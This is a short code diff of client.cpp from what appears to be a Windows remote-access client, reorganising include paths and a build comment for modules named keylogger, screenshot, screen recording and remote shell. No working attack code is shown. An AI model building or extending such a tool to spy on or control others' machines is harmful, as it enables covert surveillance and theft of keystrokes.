@@ -1,4 +1,4 @@
-//g++ client.cpp .\modules\module.cpp .\modules\ss_module.cpp .\modules\keylogger\keylogger_module.cpp .\modules\screen_recording_module.cpp .\modules\remote_shell_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
+//g++ client.cpp .\modules\codes\module.cpp .\modules\codes\ss_module.cpp .\modules\codes\keylogger_module.cpp .\modules\codes\screen_recording_module.cpp .\modules\codes\remote_shell_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
 
 // TO DO
 // move functions to the modules directory and minimize client.cpp
@@ -18,10 +18,10 @@
 
 // module headers
 #include <memory>
-#include "modules/ss_module.h"
-#include "modules/keylogger/keylogger_module.h"
-#include "modules/screen_recording_module.h"
-#include "modules/remote_shell_module.h"
+#include "modules/headers/ss_module.h"
+#include "modules/headers/keylogger_module.h"
+#include "modules/headers/screen_recording_module.h"
+#include "modules/headers/remote_shell_module.h"
 
 #ifdef _WIN32
 #include <winsock2.h>
